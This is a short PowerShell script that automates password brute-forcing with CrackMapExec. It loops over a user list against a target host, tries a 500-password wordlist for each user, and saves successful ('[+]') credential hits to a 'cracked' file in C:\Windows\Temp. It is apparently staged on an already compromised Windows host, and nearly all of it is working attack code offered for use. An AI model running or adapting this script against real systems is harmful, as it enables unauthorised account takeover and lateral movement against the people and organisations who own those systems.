<#

TO DO
=========
Make it so can run in CLI without having to set manually 



USEAGE:

set the following varaible

$global:target = "172.16.0.10"
$global:userlist = Get-Content C:\Windows\Temp\winscanx-users.txt
$global:passlist = "C:\Windows\Temp\onhost\wordlists\pass_top-500.txt"


then run the powershell script 

C:\Windows\Temp\onhost\CrackMapExecWin\cme_brute2.ps1

#>

function run-cme {
cd C:\Windows\Temp\onhost\CrackMapExecWin\

date 
ForEach ($user in $userlist) {
echo ""
write-host ===========================[ $user ]===========================
.\crackmapexec.exe $target -u $user -p $passlist 
write-host ================================================================
Get-Content C:\Windows\Temp\cme_brute2.txt | findstr [+] | sort-object| Get-Unique > C:\Windows\Temp\cme_brute2_cracked.txt
}  
date
Get-Content C:\Windows\Temp\cme_brute2_cracked.txt
}

# Run 
run-cme | Tee C:\Windows\Temp\cme_brute2.txt

